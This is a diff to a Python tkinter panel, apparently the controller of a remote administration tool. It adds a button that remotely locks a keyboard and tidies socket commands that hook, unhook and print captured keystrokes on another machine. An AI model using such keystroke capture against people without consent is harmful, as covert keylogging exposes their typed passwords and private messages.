@@ -31,11 +31,19 @@ class Keystroke(tk.Frame):
             self, text="Xóa", command=self.keystroke_clear, width=10, height=2)
         self.btn_clear.grid(row=0, column=3, sticky=tk.N, padx=10, pady=10)
 
+        # Lock the keyboard
+        self.btn_clear = tk.Button(
+            self, text="Khóa", command=self.keystroke_lock, width=10, height=2)
+        self.btn_clear.grid(row=0, column=4, sticky=tk.N, padx=10, pady=10)
+
         # Display the text
         self.text_field = tk.Text(
             self, width=64, height=20, bg="#FFFFFF", state="disable")
         self.text_field.grid(row=1, column=0, sticky=tk.N,
-                             padx=10, pady=10, columnspan=4)
+                             padx=10, pady=10, columnspan=5)
+
+    def keystroke_lock(self):
+        self._socket.send('keystroke,lock')
 
     def print_keystroke(self, keystroke="<Not hooked>"):
         keystroke = keystroke + "\n"
@@ -44,10 +52,10 @@ class Keystroke(tk.Frame):
         self.text_field.configure(state="disable")
 
     def keystroke_hook(self):
-        self._socket.send(','.join(["keystroke", "hook"]))
+        self._socket.send('keystroke,hook')
 
     def keystroke_unhook(self):
-        self._socket.send(','.join(["keystroke", "unhook"]))
+        self._socket.send('keystroke,unhook')
 
     def keystroke_print(self):
         self._socket.send("keystroke,print")
